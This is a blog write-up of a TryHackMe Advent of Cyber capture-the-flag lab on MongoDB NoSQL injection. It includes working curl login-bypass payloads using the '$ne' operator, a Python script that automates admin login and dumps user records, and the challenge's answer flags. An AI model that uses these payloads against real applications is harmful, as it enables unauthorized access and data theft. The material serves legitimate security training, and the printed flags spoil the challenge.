<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Try Hack Me - Advent Of Cyber 3 writeup (Part 2) | Hakune Blog</title><meta name=keywords content="ctf,tech"><meta name=description content="Writeup for 2021 Try Hack Me&rsquo;s Advent of Cyber 3 (part 2)"><meta name=author content="Aki Hakune"><link rel=canonical href=https://git-akihakune.github.io/blog/adventofcyber3-2/><link crossorigin=anonymous href=/assets/css/stylesheet.min.7270dbf20dbcda7a1884928b20795b9be2a182a3ce98cd3fb731a82c6f6993de.css integrity="sha256-cnDb8g282noYhJKLIHlbm+KhgqPOmM0/tzGoLG9pk94=" rel="preload stylesheet" as=style><link rel=preload href=/static/banner.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://git-akihakune.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico><link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico><link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.94.2"><link rel=alternate hreflang=en href=https://git-akihakune.github.io/blog/adventofcyber3-2/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><link rel=manifest href=/hakune.webmanifest><link rel=stylesheet type=text/css href=/hugo-cite.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-F8M24PKNWZ"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F8M24PKNWZ",{anonymize_ip:!1})}</script><meta property="og:title" content="Try Hack Me - Advent Of Cyber 3 writeup (Part 2)"><meta property="og:description" content="Writeup for 2021 Try Hack Me&rsquo;s Advent of Cyber 3 (part 2)"><meta property="og:type" content="article"><meta property="og:url" content="https://git-akihakune.github.io/blog/adventofcyber3-2/"><meta property="og:image" content="https://git-akihakune.github.io/img/adventOfCyber3/aoc.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2021-12-17T07:36:50+07:00"><meta property="article:modified_time" content="2021-12-17T07:36:50+07:00"><meta property="og:site_name" content="Hakune Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://git-akihakune.github.io/img/adventOfCyber3/aoc.png"><meta name=twitter:title content="Try Hack Me - Advent Of Cyber 3 writeup (Part 2)"><meta name=twitter:description content="Writeup for 2021 Try Hack Me&rsquo;s Advent of Cyber 3 (part 2)"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Try Hack Me - Advent Of Cyber 3 writeup (Part 2)","item":"https://git-akihakune.github.io/blog/adventofcyber3-2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Try Hack Me - Advent Of Cyber 3 writeup (Part 2)","name":"Try Hack Me - Advent Of Cyber 3 writeup (Part 2)","description":"Writeup for 2021 Try Hack Me\u0026rsquo;s Advent of Cyber 3 (part 2)","keywords":["ctf","tech"],"articleBody":" Part 1 of 2021 Advent of Cyber Part 2 of 2021 Advent of Cyber   [Day 7] Web Exploitation: Migration Without Security This task’s learning objective is NoSQL database, particularly MongoDB. Here’s a cheatsheet from MongoDB document itself that may make our life easier.\nPersonally I’m more used to SQL databases, especially PostgreSQL. But this concise passage’s summarized it intelligibly:\nSimilar to relational databases (such as MySQL and MSSQL), MongoDB consists of databases, tables, fields but with different names where - Collections are similar to tables or views in MySQL and MSSQL. - Documents are similar to rows or records in MySQL and MSSQL. - Fields are similar to columns in MySQL and MSSQL. Also, it is useful to briefly look at and compare the query operators between MongoDB and MySQL: - $and equivalent to AND in MySQL - $or equivalent to OR in MySQL - $eq equivalent to = in MySQL Before exploiting the NoSQL injection, there are MongoDB operators that we need to be familiar with that are heavily used in the injections, which are: - $eq - matches records that equal to a certain value - $ne - matches records that are not equal to a certain value - $gt - matches records that are greater than a certain value. - $where - matches records based on Javascript condition - $exists - matches records that have a certain field - $regex - matches records that satisfy certain regular expressions. According to the task, let’s SSH into our box first:\n$ ssh thm@10.10.156.199 -p 2222 thm@10.10.156.199's password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-1059-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. Last login: Tue Dec 21 08:53:12 2021 thm@mongo-server:~$ mongosh Current Mongosh Log ID: 61c1a96abf06cbd75fee1b76 Connecting to: mongodb://127.0.0.1:27017/?directConnection=true\u0026serverSelectionTimeoutMS=2000 Using MongoDB: 5.0.3 Using Mongosh: 1.1.0  For mongosh info see: https://docs.mongodb.com/mongodb-shell/  ------  The server generated these startup warnings when booting:  2021-12-21T08:39:28.330+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem  2021-12-21T08:39:50.170+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted ------  Warning: Found ~/.mongorc.js, but not ~/.mongoshrc.js. ~/.mongorc.js will not be loaded.  You may want to copy or rename ~/.mongorc.js to ~/.mongoshrc.js. test As you may have noticed, I used mongosh shell instead of mongo as the task suggested, since mongo shell will soon be deprecated and removed.\nThe next steps are quite obvious if you consult the documentation.\ntest show dbs admin 41 kB config 36.9 kB flagdb 41 kB local 73.7 kB See that flagdb database? Our first task is to simply query its data.\ntest use flagdb switched to db flagdb flagdb show collections flagColl flagdb show tables flagColl flagdb db.flagColl.find() [  {  _id: ObjectId(\"618806af0afbc09bdf42bd6a\"),  flag: 'THM{8814a5e6662a9763f7df23ee59d944f9}'  } ] And that’s for our first task. Onto our second task - inject it.\nHere’s how its web interface look like in a browser: And if you take a look at DevTool while sending dummy username and password, you will understand what’s going on behind the scene: In short, it sends a POST request in plaintext to /login. So I tried to do it in the command line:\n$ curl -X POST -d \"username=admin\u0026password=admin\" http://10.10.92.86/login {\"msg\":\"Bad Creds\"} $ curl -X POST -d \"username=admin\u0026password[$ne]=admin\" http://10.10.92.86/login {\"msg\":\"Bad Creds\"} Oops, forgot to escape it.\n$ curl -X POST -d \"username=admin\u0026password[\\$ne]=admin\" http://10.10.92.86/login Found. Redirecting to /dashboard It worked!\nThe rest of the task’s basically doing the same with [$ne] payload. Therefore, I automated it a bit with a Python script. Enjoy. :D\n#!/usr/bin/env python3 import requests, re  location = input(\"Enter server's address (default to http://0.0.0.0/): \") or 'http://0.0.0.0/' location = [location if location[-1] == '/' else location + '/'][0] location = [location if location[0:4] == 'http' else 'http://' + location][0]  def login(session):  credentials = {'username': 'admin', 'password[$ne]': 'admin'}  response = session.post(location + 'login', data=credentials)  print(\"Logged in successfully\")  def getFlag1(session):  response = session.get(location + 'flag')  epr = re.compile(\"(THM\\{.+\\})\")  print(\"Your first flag is: {}\".format(epr.search(response.text).group(0)))  def getFlag2(session):  params = {\"username[$ne]\": \"lmao\", \"role\": \"guest\"}  response = session.get(location + 'search', params=params)  epr = re.compile(\"(THM\\{.+\\})\")  print(\"Your second flag is: {}\".format(epr.search(response.text).group(0)))  def getFlag3(session):  params = {\"username[$ne]\": \"lmao\", \"role[$ne]\": \"lmao\"}  response = session.get(location + 'search', params=params)  epr = re.compile(\"(ID:[0-9a-z]*:mcskidy:[a-z]*)\")  print(\"Your last flag is: {}\".format(epr.search(response.text).group(0)))  def main():  session = requests.Session()  login(session)  getFlag1(session)  getFlag2(session)  getFlag3(session)  if __name__ == '__main__':  main() … You can pretty much do the same with BurpSuite, even faster. However, Burp’ll eat up all RAM and halt this ancient laptop of mine, so no Burp for me. (;-;)\nAnd that’s for today’s challenge!\nInteract with the MongoDB server to find the flag. What is the flag? THM{8814a5e6662a9763f7df23ee59d944f9}\nWe discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as admin and retrieve the flag? THM{b6b304f5d5834a4d089b570840b467a8}\nOnce you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag? THM{2ec099f2d602cc4968c5267970be1326}\nUse the gift search page to perform NoSQL injection and retrieve the mcskidy record. What is the details record? ID:6184f516ef6da50433f100f4:mcskidy:admin\n","wordCount":"866","inLanguage":"en","image":"https://git-akihakune.github.io/img/adventOfCyber3/aoc.png","datePublished":"2021-12-17T07:36:50+07:00","dateModified":"2021-12-17T07:36:50+07:00","author":{"@type":"Person","name":"Aki Hakune"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/adventofcyber3-2/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)"><img src=https://git-akihakune.github.io/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://git-akihakune.github.io/vi/ title=Vi aria-label=Vi>Vi</a></li></ul></span></div><ul id=menu><li><a href=https://git-akihakune.github.io/archive/ title=timeline><span>timeline</span></a></li><li><a href=https://git-akihakune.github.io/blog/ title=blog><span>blog</span></a></li><li><a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://git-akihakune.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class="main page"><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;»&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div><h1 class=post-title>Try Hack Me - Advent Of Cyber 3 writeup (Part 2)</h1><div class=post-meta><span title="2021-12-17 07:36:50 +0700 +07">December 17, 2021</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/blog/adventOfCyber3-2.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://git-akihakune.github.io/img/adventOfCyber3/aoc.png alt="Advent Of Cyber 3"><p>Try Hack Me - Advent Of Cyber 3</p></figure><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#day-7-web-exploitation-migration-without-security aria-label="[Day 7] Web Exploitation: Migration Without Security">[Day 7] <code>Web Exploitation</code>: Migration Without Security</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><ul><li><a href=/blog/adventofcyber3/>Part 1 of 2021 Advent of Cyber</a></li><li><a href=/blog/adventofcyber3-2/>Part 2 of 2021 Advent of Cyber</a></li></ul><hr><h2 id=day-7-web-exploitation-migration-without-security>[Day 7] <code>Web Exploitation</code>: Migration Without Security<a hidden class=anchor aria-hidden=true href=#day-7-web-exploitation-migration-without-security>#</a></h2><p>This task&rsquo;s learning objective is <a href=https://www.mongodb.com/nosql-explained>NoSQL</a> database, particularly <a href=https://github.com/mongodb/mongo>MongoDB</a>. Here&rsquo;s <a href=https://www.mongodb.com/developer/quickstart/cheat-sheet/>a cheatsheet from MongoDB document itself</a> that may make our life easier.</p><p>Personally I&rsquo;m more used to SQL databases, especially <a href=https://www.postgresql.org/>PostgreSQL</a>. But this concise passage&rsquo;s summarized it intelligibly:</p><pre tabindex=0><code>Similar to relational databases (such as MySQL and MSSQL), MongoDB consists of databases, tables, fields but with different names where 

- Collections are similar to tables or views in MySQL and MSSQL.
- Documents are similar to rows or records in MySQL and MSSQL.
- Fields are similar to columns in MySQL and MSSQL.

Also, it is useful to briefly look at and compare the query operators between MongoDB and MySQL:

- $and equivalent to AND in MySQL
- $or equivalent to OR in MySQL
- $eq equivalent to = in MySQL

Before exploiting the NoSQL injection, there are MongoDB operators that we need to be familiar with that are heavily used in the injections, which are:

- $eq - matches records that equal to a certain value

- $ne - matches records that are not equal to a certain value

- $gt - matches records that are greater than a certain value.

- $where - matches records based on Javascript condition

- $exists - matches records that have a certain field

- $regex - matches records that satisfy certain regular expressions.
</code></pre><p>According to the task, let&rsquo;s SSH into our box first:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh thm@10.10.156.199 -p <span style=color:#ae81ff>2222</span>
</span></span><span style=display:flex><span>thm@10.10.156.199<span style=color:#e6db74>&#39;s password: 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-1059-aws x86_64)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Documentation:  https://help.ubuntu.com
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Management:     https://landscape.canonical.com
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Support:        https://ubuntu.com/advantage
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>This system has been minimized by removing packages and content that are
</span></span></span><span style=display:flex><span><span style=color:#e6db74>not required on a system that users do not log into.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>To restore this content, you can run the &#39;</span>unminimize<span style=color:#960050;background-color:#1e0010>&#39;</span> command.
</span></span><span style=display:flex><span>Last login: Tue Dec <span style=color:#ae81ff>21</span> 08:53:12 <span style=color:#ae81ff>2021</span>
</span></span><span style=display:flex><span>thm@mongo-server:~$ mongosh
</span></span><span style=display:flex><span>Current Mongosh Log ID: 61c1a96abf06cbd75fee1b76
</span></span><span style=display:flex><span>Connecting to:          mongodb://127.0.0.1:27017/?directConnection<span style=color:#f92672>=</span>true&amp;serverSelectionTimeoutMS<span style=color:#f92672>=</span><span style=color:#ae81ff>2000</span>
</span></span><span style=display:flex><span>Using MongoDB:          5.0.3
</span></span><span style=display:flex><span>Using Mongosh:          1.1.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For mongosh info see: https://docs.mongodb.com/mongodb-shell/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------
</span></span><span style=display:flex><span>   The server generated these startup warnings when booting:
</span></span><span style=display:flex><span>   2021-12-21T08:39:28.330+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
</span></span><span style=display:flex><span>   2021-12-21T08:39:50.170+00:00: Access control is not enabled <span style=color:#66d9ef>for</span> the database. Read and write access to data and configuration is unrestricted
</span></span><span style=display:flex><span>------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Warning: Found ~/.mongorc.js, but not ~/.mongoshrc.js. ~/.mongorc.js will not be loaded.
</span></span><span style=display:flex><span>  You may want to copy or rename ~/.mongorc.js to ~/.mongoshrc.js.
</span></span><span style=display:flex><span>test&gt; 
</span></span></code></pre></div><p>As you may have noticed, I used <code>mongosh</code> shell instead of <code>mongo</code> as the task suggested, since <code>mongo</code> shell will soon be deprecated and removed.</p><p>The next steps are quite obvious if you consult <a href=https://docs.mongodb.com/manual/tutorial/getting-started/>the documentation</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>test<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>show</span> dbs
</span></span><span style=display:flex><span><span style=color:#66d9ef>admin</span>     <span style=color:#ae81ff>41</span> kB
</span></span><span style=display:flex><span>config  <span style=color:#ae81ff>36</span>.<span style=color:#ae81ff>9</span> kB
</span></span><span style=display:flex><span>flagdb    <span style=color:#ae81ff>41</span> kB
</span></span><span style=display:flex><span><span style=color:#66d9ef>local</span>   <span style=color:#ae81ff>73</span>.<span style=color:#ae81ff>7</span> kB
</span></span></code></pre></div><p>See that <code>flagdb</code> database? Our first task is to simply query its data.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>test<span style=color:#f92672>&gt;</span> use flagdb
</span></span><span style=display:flex><span>switched <span style=color:#66d9ef>to</span> db flagdb
</span></span><span style=display:flex><span>flagdb<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>show</span> collections
</span></span><span style=display:flex><span>flagColl
</span></span><span style=display:flex><span>flagdb<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>show</span> tables
</span></span><span style=display:flex><span>flagColl
</span></span><span style=display:flex><span>flagdb<span style=color:#f92672>&gt;</span> db.flagColl.find()
</span></span><span style=display:flex><span>[
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>{</span>
</span></span><span style=display:flex><span>    _id: ObjectId(<span style=color:#e6db74>&#34;618806af0afbc09bdf42bd6a&#34;</span>),
</span></span><span style=display:flex><span>    flag: <span style=color:#e6db74>&#39;THM{8814a5e6662a9763f7df23ee59d944f9}&#39;</span>
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span>]
</span></span></code></pre></div><p>And that&rsquo;s for our first task. Onto our second task - inject it.</p><p>Here&rsquo;s how its web interface look like in a browser:
<img loading=lazy src=/img/adventOfCyber3/day7/web-login.png#center alt></p><p>And if you take a look at DevTool while sending dummy username and password, you will understand what&rsquo;s going on behind the scene:
<img loading=lazy src=/img/adventOfCyber3/day7/post-request.png#center alt></p><p>In short, it sends a POST request in plaintext to <code>/login</code>. So I tried to do it in the command line:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -X POST -d <span style=color:#e6db74>&#34;username=admin&amp;password=admin&#34;</span> http://10.10.92.86/login
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;msg&#34;</span>:<span style=color:#e6db74>&#34;Bad Creds&#34;</span><span style=color:#f92672>}</span>  
</span></span><span style=display:flex><span>$ curl -X POST -d <span style=color:#e6db74>&#34;username=admin&amp;password[</span>$ne<span style=color:#e6db74>]=admin&#34;</span> http://10.10.92.86/login
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;msg&#34;</span>:<span style=color:#e6db74>&#34;Bad Creds&#34;</span><span style=color:#f92672>}</span>    
</span></span></code></pre></div><p>Oops, forgot to escape it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -X POST -d <span style=color:#e6db74>&#34;username=admin&amp;password[\$ne]=admin&#34;</span> http://10.10.92.86/login
</span></span><span style=display:flex><span>Found. Redirecting to /dashboard
</span></span></code></pre></div><p>It worked!</p><p>The rest of the task&rsquo;s basically doing the same with <code>[$ne]</code> payload. Therefore, I automated it a bit with a Python script. Enjoy. :D</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests<span style=color:#f92672>,</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>location <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Enter server&#39;s address (default to http://0.0.0.0/): &#34;</span>) <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;http://0.0.0.0/&#39;</span>
</span></span><span style=display:flex><span>location <span style=color:#f92672>=</span> [location <span style=color:#66d9ef>if</span> location[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#66d9ef>else</span> location <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;/&#39;</span>][<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>location <span style=color:#f92672>=</span> [location <span style=color:#66d9ef>if</span> location[<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>4</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;http&#39;</span> <span style=color:#66d9ef>else</span> <span style=color:#e6db74>&#39;http://&#39;</span> <span style=color:#f92672>+</span> location][<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>(session):
</span></span><span style=display:flex><span>        credentials <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;username&#39;</span>: <span style=color:#e6db74>&#39;admin&#39;</span>, <span style=color:#e6db74>&#39;password[$ne]&#39;</span>: <span style=color:#e6db74>&#39;admin&#39;</span>}
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(location <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;login&#39;</span>, data<span style=color:#f92672>=</span>credentials)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Logged in successfully&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getFlag1</span>(session):
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(location <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;flag&#39;</span>)
</span></span><span style=display:flex><span>        epr <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>compile(<span style=color:#e6db74>&#34;(THM\{.+\})&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Your first flag is: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(epr<span style=color:#f92672>.</span>search(response<span style=color:#f92672>.</span>text)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getFlag2</span>(session):
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;username[$ne]&#34;</span>: <span style=color:#e6db74>&#34;lmao&#34;</span>, <span style=color:#e6db74>&#34;role&#34;</span>: <span style=color:#e6db74>&#34;guest&#34;</span>}
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(location <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;search&#39;</span>, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>        epr <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>compile(<span style=color:#e6db74>&#34;(THM\{.+\})&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Your second flag is: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(epr<span style=color:#f92672>.</span>search(response<span style=color:#f92672>.</span>text)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getFlag3</span>(session):
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;username[$ne]&#34;</span>: <span style=color:#e6db74>&#34;lmao&#34;</span>, <span style=color:#e6db74>&#34;role[$ne]&#34;</span>: <span style=color:#e6db74>&#34;lmao&#34;</span>}
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(location <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;search&#39;</span>, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>        epr <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>compile(<span style=color:#e6db74>&#34;(ID:[0-9a-z]*:mcskidy:[a-z]*)&#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Your last flag is: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(epr<span style=color:#f92672>.</span>search(response<span style=color:#f92672>.</span>text)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>        session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>        login(session)
</span></span><span style=display:flex><span>        getFlag1(session)
</span></span><span style=display:flex><span>        getFlag2(session)
</span></span><span style=display:flex><span>        getFlag3(session)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>        main()
</span></span></code></pre></div><p>&mldr; You can pretty much do the same with <code>BurpSuite</code>, even faster. However, Burp&rsquo;ll eat up all RAM and halt this ancient laptop of mine, so no Burp for me. (;-;)</p><p>And that&rsquo;s for today&rsquo;s challenge!</p><p><code>Interact with the MongoDB server to find the flag. What is the flag?</code> THM{8814a5e6662a9763f7df23ee59d944f9}</p><p><code>We discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as admin and retrieve the flag?</code> THM{b6b304f5d5834a4d089b570840b467a8}</p><p><code>Once you are logged in, use the gift search page to list all usernames that have guest roles. What is the flag?</code> THM{2ec099f2d602cc4968c5267970be1326}</p><p><code>Use the gift search page to perform NoSQL injection and retrieve the mcskidy record. What is the details record?</code> ID:6184f516ef6da50433f100f4:mcskidy:admin</p><p><img loading=lazy src=/img/adventOfCyber3/day7/answers.png#center alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li><li><a href=https://git-akihakune.github.io/tags/tech/>tech</a></li></ul><nav class=paginav><a class=prev href=https://git-akihakune.github.io/blog/solarlog4j/><span class=title>« Prev Page</span><br><span>Try Hack Me - Solar Log4j</span></a>
